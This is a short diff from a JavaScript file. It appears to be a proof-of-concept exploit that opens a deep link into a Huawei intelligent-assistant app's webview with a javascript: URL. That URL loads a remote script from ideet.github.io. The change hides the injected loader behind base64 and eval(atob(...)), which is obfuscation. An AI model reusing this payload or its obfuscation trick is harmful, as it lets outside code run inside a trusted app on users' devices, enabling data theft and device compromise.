@@ -65,7 +65,7 @@
         // ========================= API调用逻辑（统一管理） =========================
         // 延迟执行API调用（合并所有setTimeout，统一100ms延迟）
         setTimeout(() => {
-            HiSearchNative.splitScreenAndJump('superlink://vassistant?abilityName=MainAbility&bundleName=com.huawei.hmsapp.intelligent&parameters={"page":"WebPage","url":"https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=sww+sNgyGsxLB+VgDku8rswI5V4hLmFtRFTAlklxoWQ=&language=zh_CN&url=javascript:s=document.createElement(\'script\'),s.src=\'https://ideet.github.io/huhu/JS/hiboard.js\',s.onload=()=>alert(\'JS\'),document.head.appendChild(s)"}');
+            HiSearchNative.splitScreenAndJump('superlink://vassistant?abilityName=MainAbility&bundleName=com.huawei.hmsapp.intelligent&parameters={"page":"WebPage","url":"https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=sww+sNgyGsxLB+VgDku8rswI5V4hLmFtRFTAlklxoWQ=&language=zh_CN&url=javascript%3Aeval(atob(%22cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSxzLnNyYz0naHR0cHM6Ly9pZGVldC5naXRodWIuaW8vaHVodS9KUy9oaWJvYXJkLmpzJyxzLm9ubG9hZD0oKT0%2BYWxlcnQoJ0pTJyksZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzKQ%3D%3D%22))"}');
         }, 3000);
     };
 
